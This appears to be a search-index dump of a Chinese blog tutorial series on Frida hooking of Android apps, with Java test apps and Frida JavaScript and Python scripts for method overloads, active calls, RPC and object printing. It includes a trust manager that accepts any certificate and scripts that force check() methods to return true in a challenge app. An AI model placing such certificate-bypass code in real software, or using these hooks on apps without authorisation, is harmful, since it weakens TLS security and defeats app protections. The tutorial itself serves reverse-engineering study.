//定位类 var MainActivity = Java.use(\"org.example.luodst.MainActivity\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation). MainActivity.LuoTst.overload('int', 'int').implementation = function (x, y) { //打印替换前的参数. console.log(\"original call: LuoTst(\" + x + \", \" + y + \")\"); //把参数替换成20和50,依旧调用原函数. var ret_value = this.LuoTst(20, 50); return ret_value; } }); } setImmediate(main) Frida对于函数重载Hook问题,提供了解决方案(func.overload()),就是指定函数签名.如上述中在要Hook的函数名后、关键词implementation之前添加.overload(‘int’, ‘int’)来指明具体Hook的重载函数,对于String类型,可以添加.overload(‘java.lang.String’) 手机端执行frida-server,PC端执行Js脚本. //手机端 adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server //PC端 //CLI模式 //Frida脚本是及时生效的,第一次注入使用下述命令,后续修改脚本内容,不用重新注入,只要重新保存脚本内容即可. frida -U -l luoHook.js LuoDst Hook后,点击按钮显示 70 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:3:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"主动调用 主动调用就是强制调用一个函数去执行.相应地,被动调用是由App按照正常逻辑去执行函数,函数的执行完全依靠与用户交互完成程序逻辑进而间接调用到关键函数,而主动调用则可以直接调用关键函数,主动性更强,甚至可以直接完成关键数据的\"自吐”.在逆向分析过程中,如果不想分析详细的算法逻辑,可以直接通过主动传递参数来调用关键算法函数,忽略方法函数的实现过程直接得到密文或者明文,可以说是各种算法调用的\"克星\". 在Java中,类中的函数可分为两种:类函数和实例方法.通俗的讲,就是静态的方法和动态的方法.类函数使用关键字static修饰,和对应类是绑定的,如果类函数还被public关键字修饰,在外部就可以直接通过类去调用.实例方法没有关键字static修饰,在外部只能通过创建对应类的实例再通过这个实例去调用. 在Frida中主动调用的类型会根据方法类型区分,如果是类函数的主动调用,直接使用Java.use()函数找到类进行调用即可;如果是实例方法的主动调用,则需要在找到对应的实例后对方法进行调用.这里用到了Frida中非常重要的一个API函数Java.choose(),这个函数可以在Java的堆中寻找指定类的实例. 示例如下: 准备一个测试Apk. package org.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(LuoTst(1, 2)); } }); } String LuoTst(int n1, int n2){ return String.valueOf(n1 + n2); } String LuoTst(String str){ return str.toLowerCase(); } void secret(){ Log.d(\"LuoHun\", \"this is secret func\"); } static void staticSecret(){ Log.d(\"LuoHun\", \"this is static secret func\"); } } 上述代码中新增了两个secret()函数,一个是没有static修饰的secret实例方法,一个是有static关键字修饰的staticSecret类方法. 本次我们Hook的目的是主动调用静态函数staticSecret以及动态函数secret. 编写Js脚本进行Hook. function main() { console.log(\"Script loaded successfully \"); Java.perform(function() { console.log(\"Inside java perform function\"); //静态函数主动调用 var MainActivity = Java.use(\"org.example.luodst.MainActivity\") MainActivity.staticSecret() //动态函数主动调用 Java.choose(\"org.example.luodst.MainActivity\",{ onMatch: function(instance){ console.log(\"instance found\", instance) instance.secret() }, onComplete: function(){ console.log(\"search Complete\") } }) }); } setImmediate(main) 手机端执行frida-server,PC端执行Js脚本. //手机端 adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server //PC端 //CLI模式 //Frida脚本是及时生效的,第一次注入使用下述命令,后续修改脚本内容,不用重新注入,只要重新保存脚本内容即可. frida -U -l luoHook.js LuoDst Hook后,可以看到新增了两条日志. 如果需要主动调用动态函数,必须确保存在相应类的对象,否则无法进入Java.choose这个API的回调onMatch逻辑中.比如MainActivity类对象,由于App在打开后确实运行在MainActivity界面上,那么这个对象就一定会存在,这就是所谓的\"所见即所得\"思想,这个思想在主动调用的过程中非常重要. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:3:3","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"RPC及其自动化 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:4:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"远程调用 在Frida中,可以使用Python完成JavaScript脚本对进程的注入以及相应的Hook. 准备一个测试Apk. package org.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { private String total = \"Hello\"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(LuoTst(1, 2)); } }); } String LuoTst(int n1, int n2){ return String.valueOf(n1 + n2); } String LuoTst(String str){ return str.toLowerCase(); } void secret(){ total +=\" secretFunc\"; Log.d(\"LuoHun\", \"this is secret func\"); } static void staticSecret(){ Log.d(\"LuoHun\", \"this is static secret func\"); } } 在上述代码中,增加了一个字符串类型的实例变量total,同时每次调用secret()函数对字符串进行扩展.本次我们Hook的目的是获取total这个实例变量的值. 在主动调用时需要注意的是,Java中的变量也存在是否使用static修饰的区别. 编写Js脚本进行Hook. function CallSecretFunc() { Java.perform(function () { //动态函数主动调用 Java.choose(\"org.example.luodst.MainActivity\", { onMatch: function (instance) { instance.secret() }, onComplete: function () {} }) }); } function getTotalValue() { Java.perform(function () { //动态字段主动调用 Java.choose(\"org.example.luodst.MainActivity\", { onMatch: function (instance) { console.log(\"total value = \", instance.total.value) }, onComplete: function () {} }) }) } rpc.exports = { callsecretfunc: CallSecretFunc, gettotalvalue: getTotalValue }; 如果要获取变量的值,只需要在变量后加上一个.value关键词.如上述的total.value 上述代码最后的RPC代码实现的功能是将CallSecretFunc()函数和getTotalValue()函数分别导出为callsecretfunc和gettotalvalue.需要注意的是,导出名不可以有大写字母或者下划线. 编写Python代码来加载上述的Js代码. import frida import sys def on_message(message, data): if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) else: print(message) #无线连接 # /data/local/tmp/frida-server -l 0.0.0.0:6666 # Wifi ADB监听IP和端口为192.168.2.111:5555 #device = frida.get_device_manager().add_remote_device(\"192.168.2.111:6666\") #有线连接 device = frida.get_usb_device() process = device.attach(\"com.example.luodst\") with open(\"luoHook.js\", encoding = \"UTF-8\") as f: jsCode = f.read() script = process.create_script(jsCode) script.on('message', on_message) script.load() command = \"\" while 1 == 1: command = input(\"\\nEnter command:\\n1: Exit\\n2: Call secret function\\n3: Get Total Value\\nchoice:\") if command == \"1\": break elif command == \"2\": script.exports.callsecretfunc() elif command == \"3\": script.exports.gettotalvalue() 重新运行App,然后直接运行loader.py,运行结果如下图. 和单纯执行JavaScript是一致的,下面对Frida相关代码进行说明. 首先通过frida.get_usb_device()获取到USB设备句柄;然后通过device.attach(“LuoDst”)对LuoDst这个进行进行注入;接着使用create_script()函数加载上述编写的JavaScript代码,并使用script.on(‘message’, on_message)注册了自己的消息对应的函数,每当JavaScript想要输出时,都会经过这里指定的on_message进行;最后,也就是最重要的RPC调用代码,即通过script.exports访问所有我们在JavaScript中定义的导出名,进而调用导出函数.这样就完成了RPC远程调用,达到了在主机上可以随意调用App代码的目的. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:4:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"互联互通 本次实验主要是记录Frida中Python和JavaScript代码的互通过程,由Python发送数据到JavaScript进而影响Hook的结果. 准备一个测试Apk. package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(\"Hello com.example.luodst !\"); } }); } } 本次我们Hook的目标函数是android.widget.TextView.setText(CharSequence text) JavaScript代码. //luoHook.js Java.perform(function () { console.log(\"Inside java perform function\"); Java.use(\"android.widget.TextView\").setText.overload('java.lang.CharSequence').implementation = function (x) { var strSend = x.toString(); var strRecv; send(strSend); recv(function (received_json_objection) { strRecv = received_json_objection.my_data; console.log(\"strRecv \", strRecv) }).wait() var javaStr = Java.use('java.lang.String').$new(strRecv); var result = this.setText(javaStr) console.log(\"javaStr result\", javaStr, result) return result } }) Python代码. #loader.py import frida import sys def on_message(message, payload): print(message) if message['type'] == 'send': print(message[\"payload\"]) data = \"Hello XiaLuoHun !\" script.post({\"my_data\": data}) print(\"Modified data send !\") #无线连接 # /data/local/tmp/frida-server -l 0.0.0.0:6666 # Wifi ADB监听IP和端口为192.168.2.111:5555 #device = frida.get_device_manager().add_remote_device(\"192.168.2.111:6666\") #有线连接 device = frida.get_usb_device() process = device.attach(\"com.example.luodst\") with open(\"luoHook.js\", encoding=\"UTF-8\") as f: jsCode = f.read() script = process.create_script(jsCode) script.on('message', on_message) script.load() input() 运行结果如下图. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:4:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"参数构造 Frida的JavaScript API 技巧 开发时如何打印,Frida中也是如何打印. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:5:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"数组 Java代码如下: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d(\"SimpleArray\", \"onCreate: SImpleArray\"); char arr[][] = new char[4][]; // 创建一个4行的二维数组 arr[0] = new char[] { '春', '眠', '不', '觉', '晓' }; // 为每一行赋值 arr[1] = new char[] { '处', '处', '闻', '啼', '鸟' }; arr[2] = new char[] { '夜', '来', '风', '雨', '声' }; arr[3] = new char[] { '花', '落', '知', '多', '少' }; Log.d(\"SimpleArray\", \"-----横版-----\"); for (int i = 0; i \u003c 4; i++) { // 循环4行 Log.d(\"SimpleArraysToString\", Arrays.toString(arr[i])); //Log.d(\"SimpleStringBytes\", Arrays.toString (Arrays.toString (arr[i]).getBytes())); for (int j = 0; j \u003c 5; j++) { // 循环5列 //Log.d(\"SimpleArray\", Character.toString(arr[i][j])); // 输出数组中的元素 } if (i % 2 == 0) { Log.d(\"SimpleArray\", \",\");// 如果是一、三句，输出逗号 } else { Log.d(\"SimpleArray\", \"。\");// 如果是二、四句，输出句号 } } } } 目前想要Hook上述代码中如下语句: //Arrays.toString(arr[i]) 参数为数组 Log.d(\"SimpleArraysToString\", Arrays.toString(arr[i])); JavaScript代码如下: //Frida JavaScript API示例 //Java.array(type, elements) const values = Java.array('int', [ 1003, 1005, 1007 ]); const JString = Java.use('java.lang.String'); const str = JString.$new(Java.array('byte', [ 0x48, 0x65, 0x69 ])); //Hook代码 function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { console.log(\"Inside java perform function\"); //定位类 var clsArrays = Java.use(\"java.util.Arrays\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) clsArrays.toString.overload('[C').implementation = function (x) { //这里x的类型是一个char数组 //构造一个char数组 var charArray = Java.array('char', [ '一','去', '二', '三', '里' ]); var result = this.toString(charArray) //关注这里打印的日志 console.log(\"x, result\", JSON.stringify(charArray), result) return result } }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:5:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"强制类型转换 在Frida中,将父类转换为子类是不行的,但是可以把子类转换为父类,从而调用父类的方法. Java代码如下: package com.example.luodst; import android.util.Log; public class Water { // 水 类 public static String flow(Water W) { // 水 的方法 // SomeSentence Log.d(\"2Object\", \"water flow: I`m flowing\"); return \"water flow: I`m flowing\"; } public String still(Water W) { // 水 的方法 // SomeSentence Log.d(\"2Object\", \"water still: still water runs deep!\"); return \"water still: still water runs deep!\"; } } package com.example.luodst; import android.util.Log; public class Juice extends Water { // 果汁 类 继承了水类 public String fillEnergy() { Log.d(\"2Object\", \"Juice: i`m fillingEnergy!\"); return \"Juice: i`m fillingEnergy!\"; } public static void main() { Water w1 = new Water(); flow(w1); // Juice J = new Juice(); // 实例化果汁类对象 flow(J); // 调用水的方法 向上转型 J → W Water w2 = new Juice(); ((Juice) w2).fillEnergy(); } } package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Juice.main(); } } JavaScript代码如下: //Frida JavaScript API示例 //Java.cast(handle, klass) const Activity = Java.use('android.app.Activity'); const activity = Java.cast(ptr('0x1234'), Activity); function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { var JuiceHandle = null ; Java.choose(\"com.example.luodst.Juice\",{ onMatch:function(instance){ console.log(\"found instance :\",instance); console.log(\"filling energy,\",instance.fillEnergy()); JuiceHandle= instance; },onComplete:function(){\"Search Completed!\"} }) var WaterHandle = Java.cast(JuiceHandle ,Java.use(\"com.example.luodst.Water\")); console.log(\"Water invoke still \", WaterHandle.still(WaterHandle)); }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:5:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"接口 Java代码如下: package com.example.luodst; public interface liquid { public String flow(); } package com.example.luodst; import android.util.Log; public class milk implements liquid { public String flow() { Log.d(\"3interface\", \"flowing : interface \"); return \"nihao\"; } public static void main() { milk m = new milk(); m.flow(); } } package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); milk.main(); } } JavaScript代码如下: //Frida JavaScript API示例 //Java.registerClass(spec) const SomeBaseClass = Java.use('com.example.SomeBaseClass'); const X509TrustManager = Java.use('javax.net.ssl.X509TrustManager'); const MyTrustManager = Java.registerClass({ name: 'com.example.MyTrustManager', implements: [X509TrustManager], methods: { checkClientTrusted(chain, authType) { }, checkServerTrusted(chain, authType) { }, getAcceptedIssuers() { return []; }, } }); function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { var beer = Java.registerClass({ name: 'com.example.luodst.beer', implements: [Java.use('com.example.luodst.liquid')], methods: { flow: function () { console.log(\"look I`m beer!\"); return \"taste good!\"; } } }); console.log(\"beer.flow:\",beer.$new().flow()); }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:5:3","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"枚举 https://www.cnblogs.com/jingmoxukong/p/6098351.html Java枚举.pdf 除了不能继承,基本上可以把枚举看做一个常规的类. Java代码如下: package com.example.luodst; import android.util.Log; enum Signal { GREEN, YELLOW, RED } public class TrafficLight { public static Signal color = Signal.RED; public static void main() { //Log.d(\"4enum\", \"enum \"+ color.getClass().getName().toString()); Log.d(\"4enum\", \"enum \"+ color); switch (color) { case RED: color = Signal.GREEN; break; case YELLOW: color = Signal.RED; break; case GREEN: color = Signal.YELLOW; break; } } } package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TrafficLight.main(); } } JavaScript代码如下: function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { Java.choose(\"com.example.luodst.Signal\",{ onMatch:function(instance){ console.log(\"found instance:\",instance) console.log(\"invoke getDeclaringClass\",instance.getDeclaringClass()) },onComplete:function(){console.log(\"Search Completed!\")} }) }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:5:4","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Map Java代码如下: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; import java.util.HashMap; import java.util.Iterator; import java.util.Map; import java.util.Set; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Map\u003cString, String\u003e LuoMap = new HashMap\u003c\u003e(); // 创建Map集合对象 LuoMap.put(\"ISBN 978-7-5677-8742-1\", \"Android项目开发实战入门\"); // 向Map集合中添加元素 LuoMap.put(\"ISBN 978-7-5677-8741-4\", \"C语言项目开发实战入门\"); LuoMap.put(\"ISBN 978-7-5677-9097-1\", \"PHP项目开发实战入门\"); LuoMap.put(\"ISBN 978-7-5677-8740-7\", \"Java项目开发实战入门\"); //Log.d(\"5map\", \"key值toString\"+LuoMap.toString()); Set\u003cString\u003e set = LuoMap.keySet(); // 构建Map集合中所有key的Set集合 Iterator\u003cString\u003e it = set.iterator(); // 创建Iterator迭代器 Log.d(\"5map\", \"key值：\"); while (it.hasNext()) { // 遍历并输出Map集合中的key值 try { Thread.sleep(1000); Log.d(\"5map\", it.next()+\" \"); } catch (InterruptedException e) { e.printStackTrace(); } } } } JavaScript代码如下: 下述代码,用来打印Map中存放的值. function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { Java.choose(\"java.util.HashMap\", { onMatch: function (instance) { if (instance.toString().indexOf(\"ISBN\") != -1) { console.log(\"found instance:\", instance) console.log(\"invoke \", instance.toString()) } }, onComplete: function () { console.log(\"Search Completed!\") } }) }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:5:5","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Non-ASCII https://api-caller.com/2019/03/30/frida-note/ Frida-Non-ASCII.pdf Java代码如下: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; import java.util.HashMap; import java.util.Iterator; import java.util.Map; import java.util.Set; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d(\"LuoHun\", \"onCreate: \" + ֏(10)); } int ֏(int x) { return x + 100; } } JavaScript代码如下: function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { var targetClass = \"com.example.luodst.MainActivity\"; var hookCls = Java.use(targetClass); var methods = hookCls.class.getDeclaredMethods(); for (var i in methods) { console.log(methods[i].toString()); console.log(encodeURIComponent(methods[i].toString().replace(/^.*?\\.([^\\s\\.\\(\\)]+)\\(.*?$/, \"$1\"))); } hookCls[decodeURIComponent(\"%D6%8F\")] .implementation = function (x) { console.log(\"original call: fun(\" + x + \")\"); var result = this[decodeURIComponent(\"%D6%8F\")](900); return result; } }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:5:6","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"小技巧 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:6:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"打印堆栈 function main() { console.log(\"Script loaded successfully \"); Java.perform(function() { console.log(\"Inside java perform function\"); //定位类 var MainActivity = Java.use(\"com.example.luodst.MainActivity\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) MainActivity.LuoTst.implementation = function (x, y) { //打印堆栈调用 console.log(Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Throwable\").$new())); //打印替换前的参数. console.log(\"original call: LuoTst(\" + x + \", \" + y + \")\"); //把参数替换成20和50,依旧调用原函数. var ret_value = this.LuoTst(20, 50); return ret_value; } }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:6:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"启动一个App并Hook //frida -U -f com.example.luodst -l luoHook.js //%resume //-f选项 就是创建一个进程 frida -U -f com.example.luodst -l luoHook.js --no-pause ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:6:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"打印Object 可以调Gson库或者使用Frida内部的API来打印. https://github.com/google/gson Java代码如下: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d(\"SimpleArray\", \"onCreate: SImpleArray\"); char arr[][] = new char[4][]; // 创建一个4行的二维数组 arr[0] = new char[] { '春', '眠', '不', '觉', '晓' }; // 为每一行赋值 arr[1] = new char[] { '处', '处', '闻', '啼', '鸟' }; arr[2] = new char[] { '夜', '来', '风', '雨', '声' }; arr[3] = new char[] { '花', '落', '知', '多', '少' }; Log.d(\"SimpleArray\", \"-----横版-----\"); for (int i = 0; i \u003c 4; i++) { // 循环4行 Log.d(\"SimpleArraysToString\", Arrays.toString(arr[i])); //Log.d(\"SimpleStringBytes\", Arrays.toString (Arrays.toString (arr[i]).getBytes())); for (int j = 0; j \u003c 5; j++) { // 循环5列 //Log.d(\"SimpleArray\", Character.toString(arr[i][j])); // 输出数组中的元素 } if (i % 2 == 0) { Log.d(\"SimpleArray\", \",\");// 如果是一、三句，输出逗号 } else { Log.d(\"SimpleArray\", \"。\");// 如果是二、四句，输出句号 } } } } 目前想要Hook上述代码中如下语句: //Arrays.toString(arr[i]) 参数为数组 Log.d(\"SimpleArraysToString\", Arrays.toString(arr[i])); 编写的JavaScript代码如下: function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { console.log(\"Inside java perform function\"); //定位类 var clsArrays = Java.use(\"java.util.Arrays\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) clsArrays.toString.overload('[C').implementation = function (x) { var result = this.toString(x) //关注这里打印的日志 console.log(\"x, result\", x, result) return result } }); } setImmediate(main) Frida内部API打印 function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { console.log(\"Inside java perform function\"); //定位类 var clsArrays = Java.use(\"java.util.Arrays\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) clsArrays.toString.overload('[C').implementation = function (x) { var result = this.toString(x) //关注这里打印的日志 console.log(\"x, result\", JSON.stringify(x), result) return result } }); } setImmediate(main) Gson打印 https://bbs.pediy.com/thread-259186.htm 用法如下: adb push到fridaserver同目录下之下. 代码. Java.openClassFile(\"/data/local/tmp/r0gson.dex\").load(); const gson = Java.use('com.r0ysue.gson.Gson'); console.log(gson.$new().toJson(xxx)); function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { console.log(\"Inside java perform function\"); Java.openClassFile(\"/data/local/tmp/r0gson.dex\").load(); const gson = Java.use('com.r0ysue.gson.Gson'); //console.log(gson.$new().toJson(xxx)); //定位类 var clsArrays = Java.use(\"java.util.Arrays\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) clsArrays.toString.overload('[C').implementation = function (x) { var result = this.toString(x) //关注这里打印的日志 console.log(\"x, result\", gson.$new().toJson(x), result) return result } }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:6:3","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"枚举(ClassLoaders) 准备一个测试App. frida_example_1.1.apk 查看相关代码 Hook frida_example_1.1.js function fifth() { Java.perform(function () { Java.choose(\"com.example.androiddemo.Activity.FridaActivity5\", { onMatch: function (instance) { console.log(\"found instance getDynamicDexCheck\", instance.getDynamicDexCheck().$className) }, onComplete: function () { console.log(\"search Complete\") } }) Java.enumerateClassLoaders({ onMatch: function (loader) { try { if (loader.findClass(\"com.example.androiddemo.Dynamic.DynamicCheck\")) { console.log(\"Succefully found loader!\", loader); Java.classFactory.loader = loader; } } catch (error) { console.log(\"found error \" + error) } }, onComplete: function () { console.log(\"enum completed!\") } }) Java.use(\"com.example.androiddemo.Dynamic.DynamicCheck\").check.implementation = function () { return true }; }) } function sixth() { Java.perform(function () { Java.use(\"com.example.androiddemo.Activity.Frida6.Frida6Class0\").check.implementation = function () { return true }; Java.use(\"com.example.androiddemo.Activity.Frida6.Frida6Class1\").check.implementation = function () { return true }; Java.use(\"com.example.androiddemo.Activity.Frida6.Frida6Class2\").check.implementation = function () { return true }; }) } function sixth2() { Java.perform(function () { Java.enumerateLoadedClasses({ onMatch: function (name, handle) { if (name.toString().indexOf(\"com.example.androiddemo.Activity.Frida6.Frida6\") \u003e= 0) { console.log(\"name\", name) Java.use(name).check.implementation = function () { return true } } }, onComplete: function () { console.log(\"enum Complete\") } }) }) } setImmediate(sixth2) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:6:4","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"概述 //在Frida脚本中实现native层Hook的API函数是Interceptor.attach(addr, callbacks) Interceptor.attach(addr, { onEnter(args) { //在函数调用前产生的回调,在这个函数中可以处理函数参数的相关内容. //被Hook的函数参数内容是以数组的方式存储在args中. }, onLeave(retval) { //在被Hook的目标函数执行完成后执行的函数. //被Hook的函数返回值用retval变量来表示. } }); 要实现对一个native层函数的Hook,最重要的就是找到该函数的首地址. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/:1:0","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Native层函数导出 如果是导出函数,可以通过下述API函数获得相应函数的首地址. //当第一个参数为null时,会在内存加载的所有模块中搜索导出符号名. //未找到相应的导出符号名时,会抛出一个异常. Module.getExportByName(moduleName | null, exportName) //未找到相应的导出符号名时,会直接返回一个null值. Module.findExportByName(moduleName | null, exportName) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/:2:0","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"测试Apk java代码: package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); while (true){ try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Log.d(\"LuoHun\", stringFromJNI()); } } public native String stringFromJNI(); } native代码: //libluonative.so #include \u003cjni.h\u003e #include \u003cstring\u003e //JNI函数的命名规则:Java_PackageName_ClassName_MethodName extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luonative_MainActivity_stringFromJNI( JNIEnv* env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } 